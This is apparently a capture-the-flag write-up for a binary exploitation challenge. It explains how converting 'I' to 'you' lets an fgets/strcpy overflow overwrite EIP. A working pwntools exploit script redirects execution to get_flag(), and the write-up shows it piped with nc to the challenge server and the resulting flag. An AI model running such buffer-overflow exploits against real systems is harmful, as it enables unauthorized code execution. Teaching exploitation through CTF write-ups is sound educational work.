### Solved by superkojiman

This binary uses fgets() to receive 32 bytes of input from the user, and later on, uses strcpy() to copy that input to another buffer. We can't overflow the buffer unless we send "I"s in our input. This is because a replace() function converts "I"s into "you"s, and 21 "I"s converted to "you"s will overflow the buffer and overwrite EIP.

There's a function called get_flag(), that returns the flag using system("cat flag.txt"). It's at address 0x8048f0d. So we just overwrite EIP with that and we should get the flag: 

```
#!/usr/bin/env python
from pwn import *
buf = ""
buf += "I"*21                   # these get converted to "you"
buf += "A"                      # used for alignment
buf +=  p32(0x8048f0d)          # address of get_flag()
open("in.txt", "w").write(buf)
```

Against the server:

```
# ./sploit.py
# cat in.txt | nc problems2.2016q1.sctf.io 1337
sctf{strcpy_was_a_mistake}
```
